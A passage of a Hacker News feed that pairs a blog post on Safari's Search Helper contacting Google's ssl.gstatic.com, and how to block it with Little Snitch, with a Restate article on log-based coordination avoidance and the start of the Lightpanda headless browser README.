<header><a href="https://lapcatsoftware.com/">Jeff Johnson</a> (<a href="https://underpassapp.com/">My apps</a>, <a href="https://www.paypal.me/JeffJohnsonWI">PayPal.Me</a>, <a href="https://mastodon.social/@lapcatsoftware" title="@lapcatsoftware@mastodon.social">Mastodon</a>)</header>

<h3>January 24 2025</h3>

<p><a href="https://www.obdev.at/products/littlesnitch/">Little Snitch</a> by Objective Development is the first app that I install on a new Mac. In fact I just bought a new Mac, an M4 MacBook Pro with nano-texture display, and I installed Little Snitch via thumb drive even before connecting the Mac to the internet. While setting up my new Mac, which came with macOS 15.2 preinstalled, I noticed that Safari attempted to connect to <code>ssl.gstatic.com</code> on launch. That domain is owned by Google!</p>
<p><img src="https://lapcatsoftware.com/articles/2025/1/6-images/1.png" width="588" height="350" alt="Safari wants to connect to ssl.gstatic.com on TCP port 443 (https)"></p>
<p>I denied the connection, but it kept happening on every launch, despite the fact that I set Safari to open with a new private window and empty page. Moreover, it happened on every launch of Safari Technology Preview too. In the Little Snitch alert window, I pressed the info button, which revealed that the connection was initiated by Safari Search Helper, a separate process from the main Safari app.</p>
<p><img src="https://lapcatsoftware.com/articles/2025/1/6-images/2.png" width="670" height="662" alt="Established by /System/Volumes/Preboot/Cryptexes/Incoming/OS/System/Library/PrivateFrameworks/SafariShared.framework/Versions/A/XPCServices/com.apple.Safari.SearchHelper.xpc/Contents/MacOS/com.apple.Safari.SearchHelper"></p>
<p>Like most web browsers nowadays, Safari launches other processes to perform dedicated tasks. To see this in action, just search for "Safari" in Activity Monitor. The advantage of using separate processes is that each process can have separate privileges, and if one process happens to crash, it doesn't cause the entire app to crash. When an internet connection is initiated by a process launched by an app, Little Snitch attempts to attribute the connection to the main app rather than to the helper process. This attribution usually makes more sense to the Little Snitch user.</p>
<p>I haven't figured out exactly why Safari Search Helper connects to <code>ssl.gstatic.com</code>, but it's definitely related to using Google as the search engine in Safari Search Settings. If I change the search engine to DuckDuckGo, for example, the connection attempts no longer occur on launch. Indeed, if I switch the search engine back from DuckDuckGo to Google in Safari Settings popup button, a connection to <code>ssl.gstatic.com</code> occurs <em>immediately</em>. None of the other search engine choices provoke a connection. I decided to permanently deny all connections to <code>ssl.gstatic.com</code> from Safari, because there's no good reason for Safari to silently contact Google when I'm not even searching.</p>
<p>Unfortunately, my new Little Snitch rule had an undesirable side effect. Although I'm trying to wean myself off, I still use Gmail, and when you set up Gmail in Mail app, it authenticates your Google account in Safari. However, the authentication kept failing for me. Looking in the Safari web inspector console, it became clear that the problem was some denied <code>ssl.gstatic.com</code> connections. Thus, I was forced to disable my Little Snitch rule and allow Safari to connect to <code>ssl.gstatic.com</code> in order to authenticate Gmail for Mail app.</p>
<p>Oddly, the <code>ssl.gstatic.com</code> connections from Safari stopped entirely after I allowed it to connect once. I discovered, comparing Safari preferences before and after, that <code>WBSOfflineSearchSuggestionsModelLastUpdateDateKey</code> had been set.</p>
<blockquote><code>defaults read com.apple.Safari WBSOfflineSearchSuggestionsModelLastUpdateDateKey</code></blockquote>
<p>I also discovered through experimentation, giving <code>WBSOfflineSearchSuggestionsModelLastUpdateDateKey</code> different date values (technically, they're string values of dates), that Safari checks for updates once a week. Thus, it was clear that Safari would make future <code>ssl.gstatic.com</code> connections, if allowed by Little Snitch. By the way, I should note that I've disabled "Include search engine suggestions" in Safari Search Settings, yet Safari is still apparently trying to download suggestions from Google?</p>
<p>What I wanted to do was create a Little Snitch rule that applied to Safari Search Helper but not to websites loaded in Safari tabs. I tried creating a new rule using the explicit path on disk of Safari Search Helper, but that didn't work. Little Snitch seemed to ignore that rule and continued to attribute Safari Search Helper connections to the Safari app.</p>
<p>I emailed Objective Development to ask whether there's any way to separate the rules in Little Snitch for the two processes, Safari and Safari Search Helper. At first, they said no, but then on reflection, they said yes!</p>
<p><img src="https://lapcatsoftware.com/articles/2025/1/6-images/3.png" width="578" height="566" alt="Safari via com.apple.Safari.SearchHelper"></p>
<p>The trick is to use "via" in the Little Snitch rule. When you're creating the rules, enter the full file paths of the two processes, separated by "via". Little Snitch will automatically replace the paths with the process names. Make sure you match both of the processes by code signing identity too. The above rule denies <code>ssl.gstatic.com</code> connections initiated by Safari Search Helper while otherwise allowing such connections by Safari.</p>
<p>It's nice to know that this trick exists, though it's unlikely that you'll need to use it much. I thought the trick might help with Google Chrome, but it turns out that most Chrome connections are initiated by the Google Chrome Helper process: not only the web page connections but also the silent connections that run in the background, for example to <code>googleapis.com</code>, <code>accounts.google.com</code>, <code>tools.google.com</code>, <code>clients1.google.com</code>, <code>clients2.google.com</code>, <code>clients3.google.com</code>, etc. Needless to say, Google Chrome phones home a lot! It was disappointing to learn that Safari makes a silent connection to Google too. I guess that the massive yearly default search engine payment from Google to Apple buys a lot of access.</p>

<header><a href="https://lapcatsoftware.com/">Jeff Johnson</a> (<a href="https://underpassapp.com/">My apps</a>, <a href="https://www.paypal.me/JeffJohnsonWI">PayPal.Me</a>, <a href="https://mastodon.social/@lapcatsoftware" title="@lapcatsoftware@mastodon.social">Mastodon</a>)</header>
<nav><a href="https://lapcatsoftware.com/articles/index.html" title="The Desolation of Blog">Articles index</a><br>
Previous: <a href="https://lapcatsoftware.com/articles/2025/1/5.html">New secure note on macOS Sequoia</a>
</nav>


</div>]]></description>
        </item>
        <item>
            <title><![CDATA[Every System is a Log: Avoiding coordination in distributed applications (117 pts)]]></title>
            <link>https://restate.dev/blog/every-system-is-a-log-avoiding-coordination-in-distributed-applications/</link>
            <guid>42813049</guid>
            <pubDate>Fri, 24 Jan 2025 13:57:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://restate.dev/blog/every-system-is-a-log-avoiding-coordination-in-distributed-applications/">https://restate.dev/blog/every-system-is-a-log-avoiding-coordination-in-distributed-applications/</a>, See on <a href="https://news.ycombinator.com/item?id=42813049">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><hr><p><strong>Building resilient distributed applications remains a tough challenge.</strong></p><p>It should be possible to focus almost entirely on the business logic and the complexity inherent to the domain. Instead, you need to review line-by-line and check: <em>“what if the service crashes here?”</em>, <em>“what if the API we call here is temporarily unavailable”</em>, <em>“what if a concurrent invocation overtakes this one here”</em>, or <em>“what if this process becomes a zombie while executing this function, how do I prevent it from corrupting the state?”</em>.</p><p>As a result, you spend a huge amount of time worrying about failover strategies, retries, race conditions, locking/fencing, ordering of operations, order visibility of changes, decoupling availability, etc. They add queues, key-value stores, locking services, schedulers, workflow orchestrators and they try to get them all to play nice together. And the hard truth is, many applications don’t get it right and are not correct under failures or even under load.</p><p><img alt="Problems in distributed applications and services" src="https://restate.dev/blog/every-system-is-a-log-avoiding-coordination-in-distributed-applications/dist_app_problems.png"></p><p>How can we radically simplify this? In this article, we walk through a core idea that addresses many of these issues, by avoiding distributed coordination. Much of this goes back to learnings from when we built <a href="https://flink.apache.org/">Apache Flink</a>.</p><p>Let’s start with an observation about distributed applications and infrastructure: <strong>Every System is a log.</strong></p><ul><li><p><strong>Message queues</strong> are logs: <a href="https://kafka.apache.org/">Apache Kafka</a>, <a href="https://pulsar.apache.org/">Pulsar</a>, <a href="https://engineering.fb.com/2019/10/07/core-infra/scribe/">Meta’s Scribe</a> are distributed implementations of the log abstraction. Message brokers (e.g., RabbitMQ, SQS) internally replicate messages through logs.</p></li><li><p><strong>Databases</strong> (and K/V stores) are logs: changes go to the write-ahead-log first, then get materialized into the tables. The database community has the famous saying <em>“The log is the database; everything else is cache (or materialized views)”</em> - often attributed to <a href="https://www.linkedin.com/in/pathelland">Pat Helland</a>. The idea of <a href="https://martin.kleppmann.com/2015/11/05/database-inside-out-at-oredev.html">“Turning the Database Inside Out”</a> starts with a log.</p></li><li><p>Distributed <strong>locking- and leader election services</strong> (like <a href="https://zookeeper.apache.org/">ZooKeeper</a>, <a href="https://etcd.io/">Etcd</a>, …) are consensus logs at their core. Consensus algorithms, like Raft, inherently model log replication.</p></li><li><p>Persistent <strong>state machines</strong> materialize logs of their state transitions.</p></li></ul><p>When you build an application or microservice that interacts, for example, with a database, a message queue, and a service API (backed by another database), you are orchestrating a handful of different logs in your business logic.</p><h2 id="applications-need-to-orchestrate-many-logs">Applications need to orchestrate many logs </h2><p>In this example, we want to implement a <code>processPayment</code> handler. The payment has an ID that identifies it. The handler is triggered from a queue (which also re-delivers the event if the handler fails or times out) and the processing involves checking a fraud detection model, updating account balance, storing the status, and sending a notification. There are other handlers that may handle the same payment ID, for example to cancel the payment, block it, unblock it, revert it.</p><p><img alt="An example, naïve implementation" src="https://restate.dev/blog/every-system-is-a-log-avoiding-coordination-in-distributed-applications/code_simple.png"></p><p>You can probably spot some issues:</p><ol><li>Concurrent invocations <em>(other handlers like “cancel”, or retries of the same event)</em> can produce arbitrary results.</li><li>A failure after line 15 means the next retry does nothing and we don’t send a notification.</li><li>If the fraud model is not completely deterministic (or if it is updated between retries), we might assume a payment is valid, crash after line 9, the retry declares the payment not valid, and we are setting the status to BLOCKED despite the fact that we withdrew the money.</li></ol><p>Nasty stuff! Let’s try to improve that.</p><p><img alt="An example, more elaborate implementation" src="https://restate.dev/blog/every-system-is-a-log-avoiding-coordination-in-distributed-applications/code_complex.png"></p><p>This second version of the code does some things better, but still has issues. One of them is around line 20, where we need to ensure that we are still the owner of the lock at the point in time where the database persists the update. That is really hard to do, because distributed lock release or re-entrance is never 100% correct, due to the impossibility of precise failure detection <em>(is a process failed or just slow or is our network partitioned?)</em>, so locking generally requires an additional fencing mechanism. Martin Kleppmann has <a href="https://martin.kleppmann.com/2016/02/08/how-to-do-distributed-locking.html">a great blog post</a> about the rabbit hole of getting distributed locking right.</p><p>Why is it so hard to make this seemingly simple handler work reliably? Because our goal is to make consistent changes depending on the status of disparate systems, where each has its own view of the world, maintained in its separate log.</p><p>Distributed applications often need to <span>implement a complex orchestration of all the systems they interact with</span>, carefully <span>designing all states and operations, to establish order and invariants</span> that help them ensure correctness. This is the heart of much of the complexity in modern distributed applications.</p><h2 id="what-if-it-were-all-the-same-log">What if it were all the same Log? </h2><p>Now let’s assume that all these systems (queues, DBs, locks, …) operate off the same log - for the sake of this thought experiment - the log of the message queue that delivers the <code>PaymentEvent</code> to the <code>processPayment</code> handler (the <em>upstream log</em>).</p><p>Every time our <code>processPayment</code> handler wants to change some state of another system, it writes a record to the upstream log. That new record is linked to the original <code>PaymentEvent</code>. Whenever the queue decides to re-deliver the <code>PaymentEvent</code> again (e.g., under a timeout or an assumed failure), it also attaches all linked log entries (the <em>journal</em>).</p><p><img alt="Implementing a step journal into the log" src="https://restate.dev/blog/every-system-is-a-log-avoiding-coordination-in-distributed-applications/one_log_journal.png"></p><p>Now we can adjust lines 9,10,11 (the call to the fraud-detector API and storing the result) to write the result of the API call to the upstream log. When the handler is retried after a potential failure, it automatically sees whether the result was written before. This is not just efficient, but we no longer store completed steps in a shared DB where it is easy to have it accidentally picked up in unexpected ways (see <a href="https://portswigger.net/research/smashing-the-state-machine">this article</a> for how this can be a severe security and integrity loophole).</p><p>This becomes particularly useful, if we require a <em>conditional append</em> to add an entry to the log: We can only append that entry, if no newer retry was triggered. That is easy for a queue to track (it knows whether it sent the <code>PaymentEvent</code> out again) and our <code>processPayment</code> handler would quit if the conditional append failed, knowing that another retry attempt has taken over.</p><p>Now, concurrently executing retries (if the queue incorrectly assumes a handler failed and re-sent the event) can no longer corrupt the step history. This implementation gives us pretty strong workflow-style execution guarantees for our code!</p><p><img alt="Safety through conditional appends to the log" src="https://restate.dev/blog/every-system-is-a-log-avoiding-coordination-in-distributed-applications/one_log_conditional_append.png"></p><p>To make locking (line 2) and state update (line 20) work reliably, the <code>processPayment</code> handler writes the relevant events (<em>acquire lock</em>, <em>release lock</em>, <em>update state</em>) to the upstream log as well. After writing the <em>acquire lock</em> event, the handler waits until the lock service grants the lock.<br>The lock service and the database now follow the upstream log as if it was their own write-ahead log. The database can simply apply the update when it reads the event, the locking service of course only grants the lock when available (might have to wait to encounter the previous holder’s <em>release lock</em> event).</p><p><img alt="Locking and state management through the log" src="https://restate.dev/blog/every-system-is-a-log-avoiding-coordination-in-distributed-applications/one_log_lock_state.png"></p><p>Somewhat surprisingly, this pretty much eliminates all problems and corner cases we had with locks and state before: Lock acquisition and release through the upstream log and handler’s journal means we reliably keep the lock across retries. Having the update event conditionally appended to the same event journal as the lock event replaces the need for the lock’s fencing token - plus, we can be sure that we apply the update once and only once.</p><p>So, once we implement our logic like this, EVERYTHING JUST WORKS.</p><p>We can inject all sorts of failures, stalls, network partitions. As long as the log is correctly implemented, the program will always remain correct. And all that the <code>processPayment</code> handler needs to do is (1) trigger actions as conditional-log-appends and (2) skip over actions whose log entries are already attached to the <code>PaymentEvent</code>. This is super easy to implement in a library, because it doesn’t require any form of distributed coordination.</p><h2 id="if-everythings-in-one-log-theres-nothing-to-coordinate">If everything’s in one log, there’s nothing to coordinate </h2><p>We haven’t added a new distributed system primitive; in fact we’ve removed several. The benefits come from avoiding the need for coordination.</p><p>Before we started using the same log, the state was spread across systems: The status of the operation, whether a lock is held, who held it, what value a branch was based on. Because each system maintains their state as if it was independent, the different parts of the state can get out-of-sync and be altered in unexpected ways (e.g., through a race condition or zombie process). It’s hard to implement robust logic and guarantee strong invariants that way.</p><p>Having a single place (the one log) that forces a linear history of events as the ground truth and owns the decision of who can add to that ground truth, means we don’t have to coordinate much any more.</p><p>Coordination avoidance is one of the few silver bullets in distributed systems - a way to reduce complexity, rather than shift it. For example, guarding our second code snippet with a ZooKeeper lock only shifted complexity. It reduced the code’s need to worry about concurrency, but introduced issues around lost locks and cleanup of persistent locks. In contrast, the approach to unify the different states in one log actually reduced work, which resulted in higher efficiency, fewer corner cases, and easier operations.</p><p>I know what you’re thinking: That’s a nice thought experiment, but my queue/log doesn’t work like that, my database doesn’t follow some other log, and isn’t this breaking all rules for separation of concerns?</p><h2 id="adopting-this-idea-in-practice">Adopting this idea in practice </h2><p>This idea can serve as a conceptual blue-print for an architecture based on a log (e.g., Kafka) - a bit like <a href="https://martin.kleppmann.com/2015/11/05/database-inside-out-at-oredev.html">“Turning the Database Inside Out”</a> <em>(maybe we should call this “Turning the Microservice Inside Out?”)</em>. In practice, today’s log implementations miss efficient built-in ways to track retries, make conditional-appends, link events into a journal, and would leave that to the application developer to implement.</p><p><a href="https://restate.dev/"><strong>Restate</strong></a> is an implementation of this idea. Restate Server is the broker that owns the upstream log and push-invokes the handlers with events (e.g., similar to AWS SNS and Event Bridge), ensuring reliable retries after crashes. Every event gets the latest <em>execution journal</em> (set of linked events) attached, just as described in the thought experiment above. Restate uses bi-directional streaming protocols (e.g., HTTP/2) to invoke the event handlers and send journal events and acknowledgements back and forth.</p><p><img alt="Restate in an application stack" src="https://restate.dev/blog/every-system-is-a-log-avoiding-coordination-in-distributed-applications/restate_in_the_stack.png"></p><p>The server issues a <em>unique epoch to every invocation and retry</em>, which the SDK attaches to every journal event that it sends, allowing the server to reject events from subsumed handler executions <em>(the conditional append)</em>.</p><p>The code snippet shows the example in Restate’s API <em>(here TypeScript, but Java, Kotlin, Python, Go, and Rust are supported as well)</em>. The code does not explicitly append log events, but rather uses an SDK for actions, and the SDK interacts with the log.</p><p><img alt="Example code with the Restate SDK" src="https://restate.dev/blog/every-system-is-a-log-avoiding-coordination-in-distributed-applications/code_restate.png"></p><p>To persist intermediate steps (line 8), handlers use the SDK (<code>ctx.run</code>), which sends the event to the log and awaits the ack of the conditional append to the event’s <em>execution journal</em>. On retries, the SDK checks the <em>journal</em> whether the step’s event already exists and restores the result from there directly.</p><p>Messages to other handlers are transported with exactly-once semantics (line 16). Message and RPC events are both added to the journal and routed to the destination handler. Similar to <code>ctx.run</code>, the journal deduplicates the message-sending steps. Because messages result in a single durable invocation (sequence of retries that share a journal), you can easily build end-to-end exactly-once semantics on top of this.</p><p>Restate supports handlers that lock a key when executing (and hold the lock across retries). Those handlers can read and update state that is scoped to that key. They are implemented similarly to the thought experiment: The lock and state update events are added to the journal and additionally processed by an embedded lock service and K/V store, making locks and state virtually incorruptible through partial failures, race conditions, zombie processes, etc.<br>These stateful handlers can be grouped together to share state. Restate calls that a <em>Virtual Object</em>, because the handlers are like methods with access to the object instance’s state. The state is infinitely retained in the K/V store, even when the log events eventually get garbage collected.</p><p><img alt="Virtual Objects in Restate" src="https://restate.dev/blog/every-system-is-a-log-avoiding-coordination-in-distributed-applications/virtual_object.png"></p><p>There are more building blocks in Restate, including <em>persistent Futures/Promises</em>, <em>timers</em>, or <em>idempotency-keys</em> . They all build on the same concept: Events routed through the same log, stored in the journal, and processed into a database or scheduler.</p><p>Applications often aim to create the behavior of <span>stateful, reliable, and resumable execution</span> for their critical functions. The single-log approach provides that with a single dependency and without coordination across queues, DBs, locks, and schedulers. Restate implements that pattern.</p><h2 id="blast-radius-and-separation-of-concerns">Blast radius and separation of concerns </h2><p>It would not make sense to use a single log for every operation in a distributed multi-service architecture. While it could give interesting properties, this would couple services too tightly, create a single giant blast radius, and void many benefits of service-oriented designs.</p><p>The sweet-spot we target with Restate’s implementation of this idea, is to drive all state that is strictly scoped to a handler or service through the log, plus transport of messages between services. The result is a coupling and blast radius similar to any event-driven service: If the upstream queue/log is down, the service cannot be invoked.</p><h3 id="state-in-a-database-or-in-the-log">State in a database or in the log? </h3><p>We assume that Restate is not going to replace general purpose databases. Shared databases should and will remain a part of the infrastructure, and continue to do what they are great at.</p><p>The K/V state built on the log is a great fit for state machines <em>(like the status of a payment)</em>, temporary state when joining/aggregating events and signals, or really any state that is purely updated through the event-driven handlers and scoped around a key (though a key may be something broader, like an aggregate root in Domain Driven Design).</p><p>It also gives you the building blocks for a highly robust and consistent core state. You can even use that to build overlays over other stores, track metadata like versions for entries in databases, or build data structures like semaphores. <a href="https://github.com/restatedev/examples/blob/main/typescript/patterns-use-cases/src/database/main.ts">Here is an example</a> of how to use this to make exactly-once updates to databases from handlers.</p><h2 id="whats-next">What’s next? </h2><p>If you want to try this pattern out for yourself and see and feel this idea in action, Restate is open source and you can download it at <a href="https://restate.dev/get-restate/">https://restate.dev/get-restate/</a></p><p>Today, Restate runs on a single node - similar to a Postgres database server. <span>In the next few weeks, we will release a first version of Distributed Restate</span>, supporting replication, scale out deployments, working with object store snapshots - stay tuned for more exciting updates during that release.</p><p>With the release, we will publish Part 2 of this article, which is looking at the design of the broker that maintains that log, drives the execution, retries, and implements the extensible logic to use the log for communication, locking, journaling, state, signals, scheduling, etc. As you might expect, if the core abstraction is a log, that system is a specific type of event-driven architecture.</p><p>In Part 3 of this series, we look at the implementation of the log that backs everything. Why not just use Kafka? Or just use Postgres?
In this case, we opted to develop a new type of log - something that generally one shouldn’t do, but once in a while, there is actually a good case for it. We believe that this is one of those cases, and will discuss the details of the log design, what makes it unique, and what it can do that’s hard to do with any existing implementation.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Lightpanda: The headless browser designed for AI and automation (124 pts)]]></title>
            <link>https://github.com/lightpanda-io/browser</link>
            <guid>42812859</guid>
            <pubDate>Fri, 24 Jan 2025 13:34:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/lightpanda-io/browser">https://github.com/lightpanda-io/browser</a>, See on <a href="https://news.ycombinator.com/item?id=42812859">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto">
  <a href="https://lightpanda.io/" rel="nofollow"><img src="https://camo.githubusercontent.com/724ab0ebf840402c19f060613ddf7325e901d6b37fd3c7ed6c72ec278ff51c1c/68747470733a2f2f63646e2e6c6967687470616e64612e696f2f6173736574732f696d616765732f6c6f676f2f6c70642d6c6f676f2e706e67" alt="Logo" height="170" data-canonical-src="https://cdn.lightpanda.io/assets/images/logo/lpd-logo.png"></a>
</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Lightpanda Browser</h2><a id="user-content-lightpanda-browser" aria-label="Permalink: Lightpanda Browser" href="#lightpanda-browser"></a></p>
<p dir="auto"><a href="https://lightpanda.io/" rel="nofollow">lightpanda.io</a></p>
<p dir="auto"><a href="https://github.com/lightpanda-io/browser/commits/main"><img src="https://camo.githubusercontent.com/bd89bc3f2433bdd3f082a6333bc730ed0dda1f3085cf214e0509f64a9af27cd0/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f636f6d6d69742d61637469766974792f6d2f6c6967687470616e64612d696f2f62726f77736572" alt="Commit Activity" data-canonical-src="https://img.shields.io/github/commit-activity/m/lightpanda-io/browser"></a>
<a href="https://github.com/lightpanda-io/browser/blob/main/LICENSE"><img src="https://camo.githubusercontent.com/2319a00670dc456df2849c9abef84e1e77689f093f9c28f92fff3946af70f301/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6c6963656e73652f6c6967687470616e64612d696f2f62726f77736572" alt="License" data-canonical-src="https://img.shields.io/github/license/lightpanda-io/browser"></a>
<a href="https://twitter.com/lightpanda_io" rel="nofollow"><img src="https://camo.githubusercontent.com/280d25e78f9721602e5435e41fe5c3a042f327306ecaff835d07fadc38dece32/68747470733a2f2f696d672e736869656c64732e696f2f747769747465722f666f6c6c6f772f6c6967687470616e64615f696f" alt="Twitter Follow" data-canonical-src="https://img.shields.io/twitter/follow/lightpanda_io"></a>
<a href="https://github.com/lightpanda-io/browser"><img src="https://camo.githubusercontent.com/46dacea76d8f88071e7194f7e6525372f421c33afc1743993a434f3c01e8fd07/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f73746172732f6c6967687470616e64612d696f2f62726f77736572" alt="GitHub stars" data-canonical-src="https://img.shields.io/github/stars/lightpanda-io/browser"></a></p>
<p dir="auto">Lightpanda is the open-source browser made for headless usage:</p>
<ul dir="auto">
<li>Javascript execution</li>
<li>Support of Web APIs (partial, WIP)</li>
<li>Compatible with Playwright, Puppeteer through CDP (WIP)</li>
</ul>
<p dir="auto">Fast web automation for AI agents, LLM training, scraping and testing with minimal memory footprint:</p>
<ul dir="auto">
<li>Ultra-low memory footprint (9x less than Chrome)</li>
<li>Exceptionally fast execution (11x faster than Chrome) &amp; instant startup</li>
</ul>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/523cfe4ac41a2ab2deccebd0b9197e8232a4a25c0511d014408181064ae853da/68747470733a2f2f63646e2e6c6967687470616e64612e696f2f6173736574732f696d616765732f62656e63686d61726b5f323032342d31322d30342e706e67"><img width="500px" src="https://camo.githubusercontent.com/523cfe4ac41a2ab2deccebd0b9197e8232a4a25c0511d014408181064ae853da/68747470733a2f2f63646e2e6c6967687470616e64612e696f2f6173736574732f696d616765732f62656e63686d61726b5f323032342d31322d30342e706e67" data-canonical-src="https://cdn.lightpanda.io/assets/images/benchmark_2024-12-04.png"></a></p>
<p dir="auto">See <a href="https://github.com/lightpanda-io/demo">benchmark details</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Quick start</h2><a id="user-content-quick-start" aria-label="Permalink: Quick start" href="#quick-start"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Install from the nightly builds</h3><a id="user-content-install-from-the-nightly-builds" aria-label="Permalink: Install from the nightly builds" href="#install-from-the-nightly-builds"></a></p>
<p dir="auto">You can download the last binary from the <a href="https://github.com/lightpanda-io/browser/releases/tag/nightly">nightly
builds</a> for
Linux x86_64 and MacOS aarch64.</p>
<div dir="auto" data-snippet-clipboard-copy-content="# Download the binary
$ wget https://github.com/lightpanda-io/browser/releases/download/nightly/lightpanda-x86_64-linux
$ chmod a+x ./lightpanda-x86_64-linux
$ ./lightpanda-x86_64-linux -h
usage: ./lightpanda-x86_64-linux [options] [URL]

  start Lightpanda browser

  * if an url is provided the browser will fetch the page and exit
  * otherwhise the browser starts a CDP server

  -h, --help      Print this help message and exit.
  --host          Host of the CDP server (default &quot;127.0.0.1&quot;)
  --port          Port of the CDP server (default &quot;9222&quot;)
  --timeout       Timeout for incoming connections of the CDP server (in seconds, default &quot;3&quot;)
  --dump          Dump document in stdout (fetch mode only)"><pre># <span>Download the binary</span>
$ <span>wget https://github.com/lightpanda-io/browser/releases/download/nightly/lightpanda-x86_64-linux</span>
$ <span>chmod a+x ./lightpanda-x86_64-linux</span>
$ <span>./lightpanda-x86_64-linux -h</span>
<span>usage: ./lightpanda-x86_64-linux [options] [URL]</span>

<span>  start Lightpanda browser</span>

<span>  * if an url is provided the browser will fetch the page and exit</span>
<span>  * otherwhise the browser starts a CDP server</span>

<span>  -h, --help      Print this help message and exit.</span>
<span>  --host          Host of the CDP server (default "127.0.0.1")</span>
<span>  --port          Port of the CDP server (default "9222")</span>
<span>  --timeout       Timeout for incoming connections of the CDP server (in seconds, default "3")</span>
<span>  --dump          Dump document in stdout (fetch mode only)</span></pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Dump an URL</h3><a id="user-content-dump-an-url" aria-label="Permalink: Dump an URL" href="#dump-an-url"></a></p>
<div dir="auto" data-snippet-clipboard-copy-content="$ ./lightpanda-x86_64-linux --dump https://lightpanda.io
info(browser): GET https://lightpanda.io/ http.Status.ok
info(browser): fetch script https://api.website.lightpanda.io/js/script.js: http.Status.ok
info(browser): eval remote https://api.website.lightpanda.io/js/script.js: TypeError: Cannot read properties of undefined (reading 'pushState')
<!DOCTYPE html>"><pre>$ <span>./lightpanda-x86_64-linux --dump https://lightpanda.io</span>
<span>info(browser): GET https://lightpanda.io/ http.Status.ok</span>
<span>info(browser): fetch script https://api.website.lightpanda.io/js/script.js: http.Status.ok</span>
<span>info(browser): eval remote https://api.website.lightpanda.io/js/script.js: TypeError: Cannot read properties of undefined (reading 'pushState')</span>
<span>&lt;!DOCTYPE html&gt;</span></pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Start a CDP server</h3><a id="user-content-start-a-cdp-server" aria-label="Permalink: Start a CDP server" href="#start-a-cdp-server"></a></p>
<div dir="auto" data-snippet-clipboard-copy-content="$ ./lightpanda-x86_64-linux --host 127.0.0.1 --port 9222
info(websocket): starting blocking worker to listen on 127.0.0.1:9222
info(server): accepting new conn..."><pre>$ <span>./lightpanda-x86_64-linux --host 127.0.0.1 --port 9222</span>
<span>info(websocket): starting blocking worker to listen on 127.0.0.1:9222</span>
<span>info(server): accepting new conn...</span></pre></div>
<p dir="auto">Once the CDP server started, you can run a Puppeteer script by configuring the
<code>browserWSEndpoint</code>.</p>
<div dir="auto" data-snippet-clipboard-copy-content="'use scrict'

import puppeteer from 'puppeteer-core';

// use browserWSEndpoint to pass the Lightpanda's CDP server address.
const browser = await puppeteer.connect({
  browserWSEndpoint: &quot;ws://127.0.0.1:9222&quot;,
});

// The rest of your script remains the same.
const context = await browser.createBrowserContext();
const page = await context.newPage();

await page.goto('https://wikipedia.com/');

await page.close();
await context.close();"><pre><span>'use scrict'</span>

<span>import</span> <span>puppeteer</span> <span>from</span> <span>'puppeteer-core'</span><span>;</span>

<span>// use browserWSEndpoint to pass the Lightpanda's CDP server address.</span>
<span>const</span> <span>browser</span> <span>=</span> <span>await</span> <span>puppeteer</span><span>.</span><span>connect</span><span>(</span><span>{</span>
  <span>browserWSEndpoint</span>: <span>"ws://127.0.0.1:9222"</span><span>,</span>
<span>}</span><span>)</span><span>;</span>

<span>// The rest of your script remains the same.</span>
<span>const</span> <span>context</span> <span>=</span> <span>await</span> <span>browser</span><span>.</span><span>createBrowserContext</span><span>(</span><span>)</span><span>;</span>
<span>const</span> <span>page</span> <span>=</span> <span>await</span> <span>context</span><span>.</span><span>newPage</span><span>(</span><span>)</span><span>;</span>

<span>await</span> <span>page</span><span>.</span><span>goto</span><span>(</span><span>'https://wikipedia.com/'</span><span>)</span><span>;</span>

<span>await</span> <span>page</span><span>.</span><span>close</span><span>(</span><span>)</span><span>;</span>
<span>await</span> <span>context</span><span>.</span><span>close</span><span>(</span><span>)</span><span>;</span></pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Build from sources</h2><a id="user-content-build-from-sources" aria-label="Permalink: Build from sources" href="#build-from-sources"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Prerequisites</h3><a id="user-content-prerequisites" aria-label="Permalink: Prerequisites" href="#prerequisites"></a></p>
<p dir="auto">Lightpanda is written with <a href="https://ziglang.org/" rel="nofollow">Zig</a> <code>0.13.0</code>. You have to
install it with the right version in order to build the project.</p>
<p dir="auto">Lightpanda also depends on
<a href="https://github.com/lightpanda-io/zig-js-runtime/">zig-js-runtime</a> (with v8),
<a href="https://www.netsurf-browser.org/" rel="nofollow">Netsurf libs</a> and
<a href="https://microsoft.github.io/mimalloc" rel="nofollow">Mimalloc</a>.</p>
<p dir="auto">To be able to build the v8 engine for zig-js-runtime, you have to install some libs:</p>
<p dir="auto">For Debian/Ubuntu based Linux:</p>
<div data-snippet-clipboard-copy-content="sudo apt install xz-utils \
    python3 ca-certificates git \
    pkg-config libglib2.0-dev \
    gperf libexpat1-dev \
    cmake clang"><pre><code>sudo apt install xz-utils \
    python3 ca-certificates git \
    pkg-config libglib2.0-dev \
    gperf libexpat1-dev \
    cmake clang
</code></pre></div>
<p dir="auto">For MacOS, you only need cmake:</p>

<p dir="auto"><h3 tabindex="-1" dir="auto">Install and build dependencies</h3><a id="user-content-install-and-build-dependencies" aria-label="Permalink: Install and build dependencies" href="#install-and-build-dependencies"></a></p>
<p dir="auto"><h4 tabindex="-1" dir="auto">All in one build</h4><a id="user-content-all-in-one-build" aria-label="Permalink: All in one build" href="#all-in-one-build"></a></p>
<p dir="auto">You can run <code>make install</code> to install deps all in one (or <code>make install-dev</code> if you need the development versions).</p>
<p dir="auto">Be aware that the build task is very long and cpu consuming, as you will build from sources all dependancies, including the v8 Javascript engine.</p>
